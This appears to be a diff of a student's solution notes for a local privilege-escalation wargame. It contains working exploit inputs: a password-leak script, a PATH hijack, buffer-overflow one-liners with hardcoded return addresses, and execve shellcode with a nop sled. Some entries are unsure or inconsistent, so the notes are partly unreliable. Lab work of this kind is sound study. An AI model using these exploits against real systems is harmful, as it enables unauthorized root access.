@@ -1,16 +1,38 @@
 Level 1: passing the escalate program after the parameter to the grep command made it execute the escalation
+
 Level 2: TOCTOU attack by changing the shell input after executing the program but before it checks the input
+
 Level 3: changed the PATH variable to include a directory with a malicious program named the same as python3
+
 Level 4: #!/usr/bin/bash
 password=$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | /levels/level4/level4 | grep "^Password was:" | cut -d' ' -f3)
 (echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA${password}"; echo escalate; cat -) | /levels/level4/level4
+
 Level 5: XOR each byte from the arrays at <PASSWD_KEY_3> and <PASSWD_PWD_1> through inspecting get_password with gdb and then getting the values from the addresses --> SuperVerySecretPassword
+
 Level 6: buffer overflow which overrides the return address (since yo is 128 bytes and rbp is 8 bytes, we need an offset of 136) with (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*136 + b"\x89\x51\x55\x55\x55\x55\x00\x00\x0a")'; cat -) | ./level6
+
 Level 7: buffer overflow on the final variable with the secret (python3 -c 'import sys; sys.stdout.buffer.write(b"0\n" + b"A"*36 + b"\xcf\x2c\n")'; cat -) | ./level7
+
+
 Level 8: ??? (python3 -c 'import sys; sys.stdout.buffer.write(b"/bin/sh" + b"A"*(93 + 8) + b"\x50\x87\xc5\xf7\xff\x7f" + b"")'; cat -) | ./level8
 
+Level 9: 
+- found that the buffer starts at 0x7fffffffe1c0 and rbp is at 0x7fffffffe230 (112 offset, making 120 bytes to pad till the return address) through gdb 
+- for some reason 88 worked but in fact sled and shellcode make 106 bytes here so the As give "" simply, 111 seems to be the max. 
+- thus we make the address 0x7fffffffe1e0 and inject the shellcode in a total input of 88 bytes, preceeded by a nop sled
+- shellcode executes execve("/usr/local/bin/escalate") putting the arguments and stuff into the right registers before
+python3 -c 'import sys; 
+nop_sled = 50 * b"\x90"
+shellcode = b"\x48\x83\xc4\x80\x48\x31\xd2\x52\x48\xbb\x65\x73\x63\x61\x6c\x61\x74\x65\x53\x48\xbb\x61\x6c\x2f\x62\x69\x6e\x2f\x2f\x53\x48\xbb\x2f\x75\x73\x72\x2f\x6c\x6f\x63\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+padding = b"A" * (88 - len(nop_sled) - len(shellcode))                                                    
+shot_at_nop_sled = b"\xe0\xe1\xff\xff\xff\x7f\x00\x00"
+number_input = b"\n2"   
+sys.stdout.buffer.write(nop_sled + shellcode + padding + shot_at_nop_sled + number_input)' | ./level8
 
-Level 9: 0x7fffffffe190
+final command: python3 ~/level9.py 152 0x7fffffffe1e0 | ./level9 
 
+Level 10: see level10.py
 
-Level 10: 
+- so, inject shellcode onto left tip of stack
+ - then overwrite return address of main/set_string with tip of stack
